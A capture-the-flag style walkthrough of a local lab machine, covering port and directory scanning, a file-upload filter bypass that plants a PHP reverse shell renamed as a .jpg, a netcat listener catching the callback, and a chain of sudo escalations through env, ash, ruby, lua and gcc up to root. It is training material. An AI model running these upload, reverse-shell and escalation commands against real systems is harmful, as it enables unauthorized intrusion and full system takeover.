# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.101 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.058 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1031ms
rtt min/avg/max/mdev = 0.058/0.079/0.101/0.021 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 13:32 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 2A:84:D1:C2:7D:36 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```
``` bash
sudo nmap -p80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 13:32 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000033s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
MAC Address: 2A:84:D1:C2:7D:36 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
```
# Web enumeration
## Dir Fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.txt (Status: 403) [Size: 275]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php (Status: 403) [Size: 275]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.html (Status: 403) [Size: 275]
index.html           (Status: 200) [Size: 5647]
themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
server-status        (Status: 403) [Size: 275]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
gobuster dir -u http://172.17.0.2/themes -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/themes
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.html (Status: 403) [Size: 275]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php (Status: 403) [Size: 275]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.txt (Status: 403) [Size: 275]
uploads              (Status: 301) [Size: 317] [--> http://172.17.0.2/themes/uploads/]
upload.php           (Status: 200) [Size: 0]
archivo.html         (Status: 200) [Size: 3380]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
## Malicious upload
``` bash
 curl -X POST \
  -F "file=;filename=" \
  -F "submit=Upload File" \
  http://172.17.0.2/themes/upload.php

Solo se permiten archivos con la extensión .jpg.
```
``` bash
curl -X POST \
  -F "file=@/home/codebylauti/workspace/tools/revshells/php-pentestmonkey;filename=revshell.jpg" \
  -F "submit=Upload File" \
  http://172.17.0.2/themes/upload.php

El archivo ha sido subido correctamente: <a href='uploads/6ac67879e7091.jpg'>uploads/6ac67879e7091.jpg</a>
```
# Reverse shell
``` bash
curl http://172.17.0.2/themes/uploads/6ac67879e7091.jpg
```
``` bash
sudo nc -lvnp 443
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 48478
whoami
www-data
```
# Privilege escalation
``` bash
cat /etc/passwd | grep /bin/sh
daphne:x:1000:1000::/home/daphne:/bin/sh
vilma:x:1001:1001::/home/vilma:/bin/sh
shaggy:x:1002:1002::/home/shaggy:/bin/sh
fred:x:1003:1003::/home/fred:/bin/sh
scooby:x:1004:1004::/home/scooby:/bin/sh
```
## Lateral movement: www-data -> daphne
``` bash
sudo -l
(daphne) NOPASSWD: /usr/bin/env
```
``` bash
 sudo -u daphne /usr/bin/env /bin/bash
```
## Lateral movement: daphne -> vilma
``` bash
sudo -l
(vilma) NOPASSWD: /usr/bin/ash
```
``` bash
sudo -u vilma /usr/bin/ash
```
## Lateral movement: vilma -> shaggy
``` bash
sudo -l
(shaggy) NOPASSWD: /usr/bin/ruby
```
``` bash
sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/bash"'
```
## Lateral movement: shaggy -> fred
``` bash
sudo -l
(fred) NOPASSWD: /usr/bin/lua
```
``` bash
sudo -u fred /usr/bin/lua -e 'os.execute("/bin/bash")'
```
## Lateral movement: fred -> scooby
``` bash
sudo -l
(scooby) NOPASSWD: /usr/bin/gcc
```
``` bash
sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s x
```
## Lateral movement: scooby -> root
``` bash
sudo -l
(root) NOPASSWD: /usr/bin/sudo
```
``` bash
sudo -u root sudo su
whoami
root
```
